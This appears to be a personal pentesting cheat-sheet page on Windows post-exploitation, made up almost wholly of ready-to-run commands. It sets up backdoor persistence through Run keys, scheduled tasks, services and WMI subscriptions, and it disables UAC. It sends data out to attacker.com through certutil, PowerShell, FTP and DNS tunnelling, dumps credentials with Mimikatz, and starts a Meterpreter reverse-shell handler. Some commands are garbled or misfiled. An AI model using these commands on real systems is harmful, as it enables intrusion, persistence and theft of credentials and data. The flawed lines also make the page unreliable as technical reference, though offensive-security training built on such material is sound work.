---
layout: notes
permalink: /notes/windows/post/
title: Windows Post Exploitation
---

# Windows Post Exploitation

## Persistence Techniques
```powershell
# Add registry run key for persistence
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d c:\\backdoor.exe

# Add registry run key for all users
reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d c:\\backdoor.exe

# Create persistent scheduled task
schtasks /create /tn "Update" /tr c:\\backdoor.bat /sc minute /mo 5

# Run scheduled task
schtasks /run /tn "Update"

# Create persistent service
sc create Backdoor binPath= "c:\\backdoor.exe" start= auto

# Start service
sc start Backdoor

# Query service status
sc qc Backdoor

# Create WMI event subscription for persistence
wmic /node:localhost /namespace:\\\\root\\subscription path __EventFilter create Name="Filter" EventNameSpace="root\\cimv2" QueryLanguage="WQL" Query="SELECT * FROM Win32_ProcessStartTrace"

wmic /node:localhost /namespace:\\\\root\\subscription path CommandLineEventConsumer create Name="Consumer" ExecutablePath="c:\\backdoor.exe" WorkingDirectory="c:\\"

wmic /node:localhost /namespace:\\\\root\\subscription path __FilterToConsumerBinding create Filter="__EventFilter.Name=\"Filter\"" Consumer="__CommandLineEventConsumer.Name=\"Consumer\""

# Disable UAC for persistence
reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f

# Create logon trigger task
schtasks /create /tn "Startup" /tr c:\\backdoor.exe /sc onlogon
```

## Data Exfiltration
```powershell
# Copy file to network share
copy c:\\sensitive.txt \\\\attacker\\share

# Copy directory recursively
xcopy c:\\data c:\\temp /E /H

# Download file via certutil
certutil -urlcache -split -f http://attacker.com/data.zip data.zip

# Upload file via PowerShell
powershell -Command "Invoke-WebRequest -Uri http://attacker.com -OutFile c:\\data.zip -Method Post -InFile c:\\data.txt"

# Send data via Netcat
nc -l 4444 < data.txt

# Compress data
compress c:\\data -o data.zip

# Encode data for exfiltration
certutil -encode data.zip data.b64

# Use DNS tunneling
dnscat2 -c attacker.com

# FTP upload
ftp -s:ftpscript.txt

# Upload via PowerShell FTP
Invoke-WebRequest -Uri ftp://attacker:password@attacker.com -Method Put -InFile c:\\data.txt
```

## Tools
- Mimikatz: ``` mimikatz.exe "sekurlsa::logonpasswords" ```
- PowerShell Empire: ``` .\empire ```
- Netcat: ``` nc -l 4444 ```
- PsExec: ``` PsExec.exe \\\\<target> -u <user> -p <pass> cmd ```
- Meterpreter: ``` msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; exploit" ```